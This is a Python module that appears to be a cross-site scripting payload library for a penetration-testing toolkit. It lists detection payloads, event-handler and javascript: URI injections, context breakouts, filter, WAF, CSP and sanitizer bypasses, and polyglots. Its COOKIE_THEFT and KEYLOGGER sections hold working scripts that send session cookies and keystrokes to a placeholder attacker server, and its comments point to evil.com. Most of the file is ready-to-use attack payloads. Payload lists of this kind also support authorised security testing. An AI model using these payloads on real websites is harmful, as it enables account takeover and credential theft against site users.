#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) Payloads
===================================

Payloads for detecting and exploiting XSS vulnerabilities.

How XSS Works:
--------------
XSS occurs when an attacker can inject JavaScript code that executes in
a victim's browser. The malicious script runs with the same privileges
as legitimate scripts from the website.

Types:
1. Reflected XSS - Payload in URL, reflected in response
2. Stored XSS - Payload saved in database, served to all users
3. DOM XSS - Payload manipulates client-side JavaScript

Impact:
- Steal session cookies → Account takeover
- Capture keystrokes → Credential theft  
- Deface website → Reputation damage
- Redirect users → Phishing
- Execute actions as victim → Unauthorized transactions
"""

# ============================================================
# DETECTION / PROOF OF CONCEPT
# ============================================================
# Simple payloads to confirm XSS exists

DETECTION = [
    # Basic script tags
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    "<script>alert(document.domain)</script>",
    "<script>alert(document.cookie)</script>",
    
    # Without alert (some WAFs block 'alert')
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    "<script>console.log('XSS')</script>",
    
    # Minimal payloads
    "<script>1</script>",
    "<script src=//evil.com/x.js>",
]


# ============================================================
# EVENT HANDLERS
# ============================================================
# XSS via HTML event attributes - works when <script> is blocked

EVENT_HANDLERS = [
    # Image errors (very common)
    "<img src=x onerror=alert(1)>",
    "<img/src=x onerror=alert(1)>",
    "<img src=x onerror='alert(1)'>",
    "<img src=x onerror=\"alert(1)\">",
    
    # SVG (often bypasses filters)
    "<svg onload=alert(1)>",
    "<svg/onload=alert(1)>",
    "<svg onload='alert(1)'>",
    
    # Body/document events
    "<body onload=alert(1)>",
    "<body onpageshow=alert(1)>",
    "<body onfocus=alert(1)>",
    
    # Input events
    "<input onfocus=alert(1) autofocus>",
    "<input onblur=alert(1) autofocus><input autofocus>",
    "<input type=image src=x onerror=alert(1)>",
    
    # Other elements
    "<video src=x onerror=alert(1)>",
    "<audio src=x onerror=alert(1)>",
    "<iframe onload=alert(1)>",
    "<object data=x onerror=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<select onfocus=alert(1) autofocus>",
    "<textarea onfocus=alert(1) autofocus>",
    "<keygen onfocus=alert(1) autofocus>",
    
    # Mouse events
    "<div onmouseover=alert(1)>hover me</div>",
    "<a onmouseover=alert(1)>hover</a>",
    "<div onclick=alert(1)>click me</div>",
]

# How event handlers work:
# HTML elements can have event attributes that execute JS when triggered.
# <img src=x> fails to load x, triggering onerror=alert(1)
# <input autofocus> immediately focuses, triggering onfocus=alert(1)


# ============================================================
# JAVASCRIPT URI
# ============================================================
# XSS via javascript: protocol in href/src attributes

JAVASCRIPT_URI = [
    # Links
    "<a href=javascript:alert(1)>click</a>",
    "<a href='javascript:alert(1)'>click</a>",
    "<a href=\"javascript:alert(1)\">click</a>",
    
    # Iframes
    "<iframe src=javascript:alert(1)>",
    "<iframe src='javascript:alert(1)'>",
    
    # Forms
    "<form action=javascript:alert(1)><button>submit</button></form>",
    
    # Object/embed
    "<object data=javascript:alert(1)>",
    "<embed src=javascript:alert(1)>",
    
    # Base tag hijacking
    "<base href=javascript:alert(1)//",
]

# How javascript: URI works:
# When a browser navigates to javascript:CODE, it executes CODE.
# Works in href, src, action, formaction, data attributes.


# ============================================================
# HTML CONTEXT BREAKOUTS
# ============================================================
# Escape from various HTML contexts

# Inside tag attribute value: <input value="INJECTION">
ATTRIBUTE_BREAKOUT = [
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    '"><img src=x onerror=alert(1)>',
    '" onfocus=alert(1) autofocus="',
    '" onmouseover=alert(1) x="',
    "' onfocus=alert(1) autofocus='",
]

# Inside tag: <input INJECTION>
TAG_BREAKOUT = [
    "onfocus=alert(1) autofocus",
    "onmouseover=alert(1)",
    "onclick=alert(1)",
    "autofocus onfocus=alert(1)",
]

# Inside comment: <!-- INJECTION -->
COMMENT_BREAKOUT = [
    "--><script>alert(1)</script><!--",
    "--><img src=x onerror=alert(1)><!--",
]

# Inside script block: <script>var x='INJECTION';</script>
SCRIPT_BREAKOUT = [
    "</script><script>alert(1)</script>",
    "';alert(1)//",
    "'-alert(1)-'",
    "\\';alert(1)//",
]

# Inside JavaScript string
JS_STRING_BREAKOUT = [
    "'-alert(1)-'",
    "\\'-alert(1)//",
    "</script><script>alert(1)</script>",
    "${alert(1)}",  # Template literal
]


# ============================================================
# FILTER BYPASS
# ============================================================
# Evade XSS filters and WAFs

FILTER_BYPASS = [
    # Case variation
    "<ScRiPt>alert(1)</ScRiPt>",
    "<SCRIPT>alert(1)</SCRIPT>",
    "<sCrIpT>alert(1)</sCrIpT>",
    
    # Tag breaking
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    "<<script>script>alert(1)<</script>/script>",
    
    # Null bytes
    "<scr%00ipt>alert(1)</scr%00ipt>",
    "<script%00>alert(1)</script>",
    
    # Encoding
    "<script>alert(String.fromCharCode(88,83,83))</script>",  # XSS
    "<img src=x onerror=alert&#40;1&#41;>",  # HTML entities
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    
    # No parentheses
    "<script>alert`1`</script>",  # Template literal
    "<script>onerror=alert;throw 1</script>",
    "<img src=x onerror=alert`1`>",
    
    # No alert keyword
    "<script>eval('ale'+'rt(1)')</script>",
    "<script>[].constructor.constructor('alert(1)')()</script>",
    "<script>window['al'+'ert'](1)</script>",
    
    # Unicode escapes
    "<script>\\u0061lert(1)</script>",
    
    # HTML encoding in event handlers
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>",
    
    # Double encoding
    "%253Cscript%253Ealert(1)%253C/script%253E",
    
    # Using eval
    "<script>eval(atob('YWxlcnQoMSk='))</script>",  # base64: alert(1)
    
    # No spaces
    "<svg/onload=alert(1)>",
    "<img/src=x/onerror=alert(1)>",
    
    # Newlines/tabs instead of spaces
    "<img\nsrc=x\nonerror=alert(1)>",
    "<img\tsrc=x\tonerror=alert(1)>",
    
    # Comments within tags
    "<img src=x onerror=/**/alert(1)>",
]


# ============================================================
# DOM XSS
# ============================================================
# Payloads targeting client-side JavaScript sinks

DOM_XSS = [
    # URL fragment (after #)
    "#<script>alert(1)</script>",
    "#<img src=x onerror=alert(1)>",
    "#'-alert(1)-'",
    
    # JavaScript protocol
    "javascript:alert(1)",
    "javascript:alert(document.domain)",
    
    # For eval() sinks
    "1;alert(1)",
    "1);alert(1)//",
    
    # For innerHTML sinks
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    
    # For document.write sinks
    "<script>alert(1)</script>",
]

# Common DOM XSS sinks to look for in JavaScript:
# - document.write()
# - innerHTML
# - outerHTML
# - eval()
# - setTimeout/setInterval with string arg
# - location.href
# - location.assign()
# - window.open()


# ============================================================
# COOKIE STEALING
# ============================================================
# Exfiltrate cookies to attacker server

COOKIE_THEFT = [
    # Image request
    "<script>new Image().src='http://ATTACKER/?c='+document.cookie</script>",
    "<img src=x onerror=\"new Image().src='http://ATTACKER/?c='+document.cookie\">",
    
    # Fetch API
    "<script>fetch('http://ATTACKER/?c='+document.cookie)</script>",
    
    # XMLHttpRequest
    "<script>var x=new XMLHttpRequest();x.open('GET','http://ATTACKER/?c='+document.cookie);x.send()</script>",
    
    # Redirect
    "<script>location='http://ATTACKER/?c='+document.cookie</script>",
]

# Replace ATTACKER with your server URL
# Example: http://evil.com/steal.php?c=STOLEN_COOKIES


# ============================================================
# KEYLOGGER
# ============================================================
# Capture keystrokes

KEYLOGGER = [
    """<script>
document.onkeypress=function(e){
    new Image().src='http://ATTACKER/?k='+e.key;
}
</script>""",
]


# ============================================================
# POLYGLOTS
# ============================================================
# Work in multiple contexts simultaneously

POLYGLOT = [
    # Works in: HTML, attribute, script, URL contexts
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//",
    
    # Comprehensive polyglot
    """'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telephones;telephones;)>'"><img src="http://i.imgur.com/P8mL8.jpg">""",
    
    # Shorter polyglot
    "'-alert(1)-'",
    '"-alert(1)-"',
]


# ============================================================
# SVG XSS
# ============================================================
# XSS via SVG files/elements

SVG = [
    '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>',
    '<svg><script>alert(1)</script></svg>',
    '<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></foreignObject></svg>',
    '<svg><a xlink:href="javascript:alert(1)"><text y="1em">Click</text></a></svg>',
    '<svg><animate onbegin="alert(1)"/>',
    '<svg><set onbegin="alert(1)"/>',
]


# ============================================================
# MUTATION XSS (mXSS)
# ============================================================
# Bypass sanitizers via browser HTML parsing quirks

MUTATION = [
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    '<form><math><mtext><form><mglyph><style></math><img src=x onerror=alert(1)>',
]


# ============================================================
# CSP BYPASS
# ============================================================
# Bypass Content Security Policy

CSP_BYPASS = [
    # If 'unsafe-inline' allowed
    "<script>alert(1)</script>",
    
    # If JSONP endpoints exist
    "<script src='https://allowed.com/jsonp?callback=alert(1)//'></script>",
    
    # If Angular.js in scope
    "{{constructor.constructor('alert(1)')()}}",
    
    # Base tag injection (if base-uri not restricted)
    "<base href='http://attacker.com/'>",
    
    # Object/embed (if object-src not restricted)
    "<object data='http://attacker.com/evil.swf'>",
]


# ============================================================
# SPECIAL CONTEXTS
# ============================================================

# Inside JSON
JSON_CONTEXT = [
    "</script><script>alert(1)</script>",
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
]

# Inside CSS
CSS_CONTEXT = [
    "}</style><script>alert(1)</script>",
    "expression(alert(1))",  # IE only
]

# Inside XML
XML_CONTEXT = [
    "<![CDATA[<script>alert(1)</script>]]>",
    "]]><script>alert(1)</script>",
]


# ============================================================
# ALL PAYLOADS COMBINED
# ============================================================

ALL = (
    DETECTION +
    EVENT_HANDLERS[:10] +
    JAVASCRIPT_URI[:5] +
    FILTER_BYPASS[:15] +
    POLYGLOT
)


# ============================================================
# USAGE EXAMPLE
# ============================================================

if __name__ == "__main__":
    print("""
XSS Payload Library
===================

Categories:
  - DETECTION ({} payloads) - Proof of concept
  - EVENT_HANDLERS ({} payloads) - Via HTML events
  - JAVASCRIPT_URI ({} payloads) - Via javascript: protocol
  - ATTRIBUTE_BREAKOUT ({} payloads) - Escape attributes
  - TAG_BREAKOUT ({} payloads) - Escape tags
  - FILTER_BYPASS ({} payloads) - Evade filters/WAF
  - DOM_XSS ({} payloads) - Client-side injection
  - COOKIE_THEFT ({} payloads) - Steal session
  - SVG ({} payloads) - SVG-based XSS
  - POLYGLOT ({} payloads) - Multi-context

Usage:
  from payloads.xss import DETECTION, FILTER_BYPASS
  
  for payload in DETECTION:
      response = test_param(url, param, payload)
      if payload in response:
          print(f"XSS found: {{payload}}")
""".format(
        len(DETECTION), len(EVENT_HANDLERS), len(JAVASCRIPT_URI),
        len(ATTRIBUTE_BREAKOUT), len(TAG_BREAKOUT), len(FILTER_BYPASS),
        len(DOM_XSS), len(COOKIE_THEFT), len(SVG), len(POLYGLOT)
    ))
